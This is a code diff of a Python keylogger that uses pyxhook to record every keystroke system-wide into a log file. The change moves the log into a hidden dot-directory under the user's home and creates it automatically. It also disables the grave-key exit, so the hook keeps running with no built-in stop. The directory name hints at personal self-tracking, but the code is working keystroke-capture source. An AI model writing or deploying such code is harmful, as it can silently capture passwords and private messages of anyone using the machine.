@@ -2,17 +2,35 @@
 
 import pyxhook # needs install via sudo pip3 install pyxhook
 import time
+import os
+import os.path as osp
 
 #change this to your log file's path
-DIR = "/home/codeman/mydata/local/tmp"
-FILE = "keyloggfile.log"
-log_file= DIR + "/" + FILE
+logFileDir = ".itsoflife/local/logs/keylogger"
+logFile = "keyloggfile.log"
 
 PAUSE_TIME = 5
 
-fob=open(log_file,'a')
-
 oldTime = time.time()
+
+def createLogDir():
+  global logFileDir, logFile
+  userHome = os.getenv("HOME", None)
+  if userHome:
+    logFileFullDirPath = osp.join(userHome, logFileDir)
+    if not os.path.exists(logFileFullDirPath):
+      print("keylogg: Attempting to create {} dir.".format(logFileFullDirPath))
+      try:
+        os.makedirs(logFileFullDirPath, exist_ok=True)
+      except Exception as e:
+        print("keylogg: failed: Can't create log dir {}: {}".format(logFileFullDirPath, e))
+        return (False, None)
+    print("keylogg: Using log dir: {}".format(logFileFullDirPath))
+    return (True, logFileFullDirPath)  # success
+  else:
+    print("keylogg: failed: Can't create log dir {}: Can't find user home.".format(logFileDir))
+    return (False, None)
+
 
 def calcTime():
   global oldTime
@@ -33,15 +51,23 @@ def OnKeyPress(event):
   fob.flush()
   #fob.write('\n')
 
-  if event.Ascii==96: #96 is the ascii value of the grave key (`)
-    fob.close()
-    new_hook.cancel()
+  #if event.Ascii==96: #96 is the ascii value of the grave key (`)
+  #  fob.close()
+  #  new_hook.cancel()
 
-#instantiate HookManager class
-new_hook=pyxhook.HookManager()
-#listen to all keystrokes
-new_hook.KeyDown=OnKeyPress
-#hook the keyboard
-new_hook.HookKeyboard()
-#start the session
-new_hook.start()
+success, fullLogDir = createLogDir()
+if success:
+    fob = open(osp.join(fullLogDir, logFile), "a")
+    fob.write("\n{STARTED}\n")
+    fob.flush()
+
+    #instantiate HookManager class
+    new_hook=pyxhook.HookManager()
+    #listen to all keystrokes
+    new_hook.KeyDown=OnKeyPress
+    #hook the keyboard
+    new_hook.HookKeyboard()
+    #start the session
+    new_hook.start()
+
+
